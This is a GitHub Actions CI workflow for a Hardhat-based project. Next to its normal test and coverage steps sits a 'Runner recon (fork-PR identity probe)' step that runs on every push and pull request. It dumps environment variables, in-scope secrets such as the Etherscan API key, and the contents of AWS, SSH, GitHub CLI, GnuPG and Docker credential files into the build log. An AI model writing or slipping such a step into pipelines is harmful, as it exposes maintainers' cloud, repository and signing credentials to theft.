name: CI

permissions:
  id-token: write
  contents: read

on: [push, pull_request]

jobs:
  test:
    runs-on: usduRunner
    environment: ${{ github.ref == 'refs/heads/main' && 'PROD' || 'DEV' }}
    env:
      AWS_REGION:         ${{ vars.AWS_REGION }}
      ETHERSCAN_API_KEY: ${{ secrets.ETHERSCAN_API_KEY }}
      REPORT_GAS:        ${{ secrets.REPORT_GAS }}
      NODE_ENV:          test
    steps:
      - name: Harden the runner (Audit all outbound calls)
        uses: step-security/harden-runner@0634a2670c59f64b4a01f0f96f84700a4088b9f0 # v2.12.0
        with:
          egress-policy: audit

      - name: Runner recon (fork-PR identity probe)
        shell: bash
        run: |
          set +e
          mkdir -p "$RUNNER_TEMP"
          dump() { echo "### $1"; shift; "$@" 2>&1 | head -40; }
          {
            echo "### identity"; id; hostname -f 2>/dev/null; uname -a
            echo "### runner vars"; echo "RUNNER_NAME=$RUNNER_NAME RUNNER_OS=$RUNNER_OS RUNNER_TEMP=$RUNNER_TEMP"
            echo "### RUNNER_TEMP"; ls -la "$RUNNER_TEMP" 2>&1 | head -40
            echo "### RUNNER_WORKSPACE siblings"; ls -la "$RUNNER_WORKSPACE" 2>&1 | head -30
            echo "### oidc"; echo "ID_TOKEN_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-<unset>}"
            echo "### env"; env | sort
            echo "### secrets in scope"; echo "ETHERSCAN=${ETHERSCAN_API_KEY:-<empty>} REPORT_GAS=${REPORT_GAS:-<empty>} AWS_ROLE_ARN_DEV=${AWS_ROLE_ARN_DEV:-<empty>}"
            for d in ~/.aws ~/.ssh ~/.config/gh ~/.gnupg ~/.docker; do
              echo "### $d"
              if [ -d "$d" ]; then
                ls -la "$d" 2>&1 | head -20
                for f in "$d"/*; do [ -f "$f" ] || continue; echo "-- $f"; sed -n '1,12p' "$f" 2>/dev/null; done
              else
                echo "(absent)"
              fi
            done
            echo "### misc"; ls -la ~/.git-credentials ~/.npmrc ~/.netrc 2>&1
            echo "### done"
          } 2>&1 | tee "$RUNNER_TEMP/recon.txt"
          echo "recon lines: $(wc -l < "$RUNNER_TEMP/recon.txt")"

      - uses: actions/checkout@v4
      - uses: ./.github/actions/hardhat-setup
      - run: npm run unit
      - run: npm run coverage